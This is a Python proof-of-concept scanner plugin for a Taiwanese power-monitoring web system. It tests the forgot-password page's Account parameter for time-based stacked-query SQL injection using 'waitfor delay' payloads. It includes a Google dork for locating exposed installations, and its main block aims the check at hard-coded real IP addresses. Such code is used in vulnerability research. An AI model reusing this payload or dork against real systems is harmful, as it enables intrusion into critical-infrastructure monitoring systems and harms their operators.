#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: 台湾省某电力监控系统通用型注入(四)
refer: http://www.wooyun.org/bugs/wooyun-2010-0102622
description:
    google dork:"智慧型電能監控管理系統"
    http://foorbar/ForgotPassword/MailPassword.aspx?System= Parameter: Account (POST)
    type: stacked queries
'''

import re
import urlparse
import time

def assign(service, arg):
    if service == 'electric_monitor':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    url = arg + 'ForgotPassword/MailPassword.aspx?System='
    post_wait_0 = 'Account=admin%27;waitfor%20delay%20%270:0:0%27--&mail=admin&send=%E5%AF%84%E5%87%BA'
    post_wait_5 = 'Account=admin%27;waitfor%20delay%20%270:0:5%27--&mail=admin&send=%E5%AF%84%E5%87%BA'
    content_type = 'Content-Type: application/x-www-form-urlencoded'


    t0 = time.time()
    code1, head, res, err, _ = curl.curl2(url, post=post_wait_0, header=content_type)
    t_0 = time.time()-t0
    if code1 == 0:
        return False
    t5 = time.time()    
    code2, head, res, err, _ = curl.curl2(url, post=post_wait_5, header=content_type)
    t_5 = time.time()-t5
    if code2 == 0:
        return False
    if code1==200 and code2==200 and t_5>5 and t_0<2:
        security_hole('SQL injection: ' + url)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('electric_monitor','http://140.129.117.243/')[1])
    #audit(assign('electric_monitor','http://203.71.247.31/')[1])